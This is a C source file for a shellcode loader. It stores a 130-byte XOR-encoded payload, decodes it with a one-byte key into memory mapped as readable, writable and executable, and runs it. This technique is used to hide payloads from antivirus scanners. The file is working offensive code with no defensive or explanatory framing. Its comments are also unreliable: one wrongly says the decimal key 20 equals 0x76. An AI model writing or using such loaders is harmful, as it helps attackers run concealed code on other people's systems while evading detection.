#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

//Compile: gcc -o shell_loader shell_loader.c -static

// Replace this with the output from the XORencoder
unsigned char encoded[] =
"\x25\xEB\x7E\x1D\x4C\x8D\xA2\x04\x5C\x9D\xC2\x59\x25\xDD\x7E\x36"
"\x55\x4E\x7E\x13\x4E\x1B\x11\x5C\x91\xD4\x6C\x45\x7E\x1E\x55\x4D"
"\x44\x7E\x3D\x4C\x8D\x7E\x16\x4B\x7E\x15\x4A\x1B\x11\x5C\x91\xD4"
"\x6C\x2F\x5C\x83\x5C\xAD\x16\x14\x05\x48\xD4\xBC\x39\xD6\x45\x5C"
"\x9D\xF2\x7E\x04\x4E\x7E\x3E\x4C\x1B\x11\x4D\x5C\x91\xD4\x6D\x31"
"\x5D\xEB\xDD\x60\x0C\x43\x7E\x37\x4C\x7E\x14\x7E\x11\x5C\x9D\xF3"
"\x5C\x25\xE2\x1B\x11\x4D\x4D\x4B\x5C\x91\xD4\x6D\xD3\x7E\x28\x4C"
"\x7E\x15\x4B\x1B\x11\x4A\x7E\x6A\x4E\x1B\x11\x5C\x91\xD4\x6C\xF9"
"\xEB\xF2";
int shellcode_len = 130;


int main() {
  // Set the XOR key used in encoding
	// Choose one format: hex (0x..) or decimal (e.g., 250)
	// If you used 0x76 during encoding, use either:
	//unsigned char key = 0x76;     // Hex format
	unsigned char key = 20;   // Decimal format (same as 0x76)


    // Allocate RWX memory
    void *mem = mmap(NULL, shellcode_len, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANON | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap failed");
        return 1;
    }

    // Decode into memory
    for (int i = 0; i < shellcode_len; i++) {
        ((unsigned char *)mem)[i] = encoded[i] ^ key;
    }

    // Execute shellcode
    ((void(*)())mem)();

    return 0;
}
